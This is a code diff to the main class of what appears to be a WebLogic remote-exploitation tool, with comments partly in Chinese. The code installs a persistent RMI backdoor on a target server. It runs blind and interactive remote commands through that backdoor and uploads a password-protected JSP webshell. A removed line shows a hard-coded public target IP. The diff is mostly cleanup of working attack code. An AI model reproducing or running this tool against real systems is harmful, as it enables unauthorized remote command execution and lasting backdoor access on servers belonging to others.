@@ -6,7 +6,6 @@ import com.supeream.weblogic.WebLogicOperation;
 import org.apache.commons.cli.*;
 import weblogic.cluster.singleton.ClusterMasterRemote;
 import weblogic.jndi.Environment;
-import weblogic.utils.encoders.BASE64Encoder;
 
 import javax.naming.Context;
 import javax.naming.NamingException;
@@ -17,13 +16,21 @@ import java.util.*;
 public class Main {
 
     public static final String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";
+    public static final String RMI_NAME = "supeream";
     public static String TYPE = "streamMessageImpl";
     public static List<String> types = Arrays.asList(new String[]{"marshall", "collection", "streamMessageImpl"});
     public static String version;
     public static CommandLine cmdLine;
     private static String cmd = "whoami";
 
-
+    /**
+     * init context
+     *
+     * @param url
+     * @return
+     * @throws NamingException
+     * @throws FileNotFoundException
+     */
     public static Context getInitialContext(String url) throws NamingException, FileNotFoundException {
         Environment environment = new Environment();
         environment.setProviderUrl(url);
@@ -32,16 +39,23 @@ public class Main {
         return environment.getInitialContext();
     }
 
+    /**
+     * check the rmi backdoor is already installed ?
+     *
+     * @param host
+     * @param port
+     * @return
+     */
     public static boolean checkIsAlreadyInstalled(String host, String port) {
         try {
             System.out.println("检查是否安装rmi实例");
-            Context initialContext = getInitialContext(converUrl(host, port));
-            ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup("supeream");
+            Context initialContext = getInitialContext(convertUrl(host, port));
+            ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup(RMI_NAME);
             System.out.println("rmi已经安装");
             invokeRmi(remoteCode);
             return true;
         } catch (Exception e) {
-            if (e.getMessage() !=null && e.getMessage().contains("supeream")) {
+            if (e.getMessage() != null && e.getMessage().contains(RMI_NAME)) {
                 System.out.println("rmi实例不存在");
             } else {
                 e.printStackTrace();
@@ -52,18 +66,23 @@ public class Main {
         return false;
     }
 
+    /**
+     * execute blind command
+     *
+     * @param host
+     * @param port
+     * @throws Exception
+     */
     public static void executeBlind(String host, String port) throws Exception {
-
         if (cmdLine.hasOption("B") && cmdLine.hasOption("C")) {
             System.out.println("执行命令:" + cmdLine.getOptionValue("C"));
             WebLogicOperation.blindExecute(host, port, cmdLine.getOptionValue("C"));
             System.out.println("执行blind命令完成");
             System.exit(0);
         }
-
     }
 
-    public static String converUrl(String host, String port) {
+    private static String convertUrl(String host, String port) {
         if (cmdLine.hasOption("https")) {
             return "t3s://" + host + ":" + port;
         } else {
@@ -73,7 +92,7 @@ public class Main {
 
     private static String cdConcat(List<String> cds) {
         StringBuffer stringBuffer = new StringBuffer();
-        for (String cd: cds) {
+        for (String cd : cds) {
             stringBuffer.append(cd);
             stringBuffer.append("&&");
         }
@@ -103,7 +122,7 @@ public class Main {
                 }
 
                 if (cmd.equalsIgnoreCase("back")) {
-                    cacheCmds.remove(cacheCmds.size()-1);
+                    cacheCmds.remove(cacheCmds.size() - 1);
                     continue;
                 }
 
@@ -111,26 +130,26 @@ public class Main {
 
                 if (!cmd.startsWith("cd ")) {
                     newCmd += cmd;
-                } else if (newCmd.length()>3){
-                    newCmd = newCmd.substring(0, newCmd.length()-2);
+                } else if (newCmd.length() > 3) {
+                    newCmd = newCmd.substring(0, newCmd.length() - 2);
                 }
 
 
                 if (Main.cmdLine.hasOption("noExecPath")) {
-                    result = remoteCode.getServerLocation("showmecode$NO$"+newCmd);
+                    result = remoteCode.getServerLocation("showmecode$NO$" + newCmd);
                 } else {
-                    result = remoteCode.getServerLocation("showmecode"+newCmd);
+                    result = remoteCode.getServerLocation("showmecode" + newCmd);
                 }
 
                 System.out.println(result);
             }
-        }  else {
+        } else {
             System.out.println("执行命令:" + cmd);
 
             if (Main.cmdLine.hasOption("noExecPath")) {
-                result = remoteCode.getServerLocation("showmecode$NO$"+cmd);
+                result = remoteCode.getServerLocation("showmecode$NO$" + cmd);
             } else {
-                result = remoteCode.getServerLocation("showmecode"+cmd);
+                result = remoteCode.getServerLocation("showmecode" + cmd);
             }
             System.out.println(result);
         }
@@ -162,7 +181,7 @@ public class Main {
 
         try {
 
-            String host = "202.60.207.169";
+            String host = "10.211.55.2";
             String port = "7001";
             CommandLineParser parser = new DefaultParser();
             cmdLine = parser.parse(options, args);
@@ -190,13 +209,13 @@ public class Main {
 
             if (cmdLine.hasOption("uploadShell")) {
                 System.out.println("开始上传一句话代码");
-                String fileName = UUID.randomUUID().toString().replace("-","");
+                String fileName = UUID.randomUUID().toString().replace("-", "");
                 WebLogicOperation.uploadFileShell(host, port, fileName);
                 String schema = "http://";
                 if (cmdLine.hasOption("https")) {
                     schema = "https://";
                 }
-                System.out.println("上传完毕请查看 path:"+schema+host+":"+port+"/bea_wls_internal/"+fileName+".jsp password:qishiwoshiyigehaoren");
+                System.out.println("上传完毕请查看 path:" + schema + host + ":" + port + "/bea_wls_internal/" + fileName + ".jsp password:qishiwoshiyigehaoren");
                 System.exit(0);
             }
 
@@ -228,8 +247,8 @@ public class Main {
             System.out.println("等待rmi实例安装成功 ");
             Thread.sleep(2000);
 
-            Context initialContext = getInitialContext(converUrl(host, port));
-            ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup("supeream");
+            Context initialContext = getInitialContext(convertUrl(host, port));
+            ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup(RMI_NAME);
             invokeRmi(remoteCode);
 
         } catch (Exception e) {
@@ -239,7 +258,7 @@ public class Main {
                 HelpFormatter formatter = new HelpFormatter();
                 formatter.printHelp("supeream", options);
             } else {
-                System.out.println("实例rmi安装失败 请切换-OB模式");
+                System.out.println("实例rmi安装失败 请切换-B模式");
                 e.printStackTrace();
             }
         }
